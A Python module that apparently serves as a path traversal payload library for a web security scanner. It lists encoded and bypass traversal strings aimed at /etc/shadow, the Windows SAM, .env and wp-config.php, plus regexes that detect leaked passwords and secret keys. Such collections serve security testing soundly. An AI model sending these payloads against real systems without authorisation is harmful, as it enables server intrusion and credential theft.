"""
路径遍历 (Path Traversal) Payload库

包含常见的目录遍历测试向量和检测模式
"""

# 路径遍历Payload
PATH_TRAVERSAL_PAYLOADS = [
    # Linux/Unix路径遍历
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    
    "../../../etc/shadow",
    "../../../etc/hosts",
    "../../../etc/hostname",
    "../../../etc/group",
    
    # Windows路径遍历
    "..\\..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\boot.ini",
    "..\\..\\..\\windows\\system.ini",
    
    # URL编码
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    
    # 双重编码
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    
    # Unicode编码
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
    
    # 绝对路径
    "/etc/passwd",
    "/etc/shadow",
    "C:\\windows\\system32\\config\\sam",
    
    # NULL字节注入
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    
    # 点号绕过
    "....//....//....//etc/passwd",
    "..../..../..../etc/passwd",
    
    # 混合斜杠
    "..\\..\\../etc/passwd",
    "..//..//..//etc/passwd",
    
    # Nginx配置文件
    "../../../etc/nginx/nginx.conf",
    "../../../var/log/nginx/access.log",
    
    # Apache配置
    "../../../etc/apache2/apache2.conf",
    "../../../var/log/apache2/access.log",
    
    # 应用配置
    "../../../.env",
    "../../../config.php",
    "../../../wp-config.php",
    "../../../application.properties",
]

# 路径遍历检测模式
PATH_DETECTION_PATTERNS = [
    # /etc/passwd内容特征
    r"root:[x*]:0:0:",
    r"daemon:",
    r"bin:",
    r"sys:",
    r"/bin/bash",
    r"/bin/sh",
    
    # /etc/shadow特征
    r"\$[0-9]\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]+",
    
    # Windows文件特征
    r"\[boot loader\]",
    r"\[operating systems\]",
    r"\[fonts\]",
    r"\[extensions\]",
    
    # 配置文件特征
    r"DB_PASSWORD",
    r"DB_HOST",
    r"SECRET_KEY",
    r"define\(",
    
    # Nginx配置
    r"server_name",
    r"listen\s+\d+",
    r"root\s+/",
    
    # Apache配置
    r"<VirtualHost",
    r"DocumentRoot",
    r"ServerName",
]
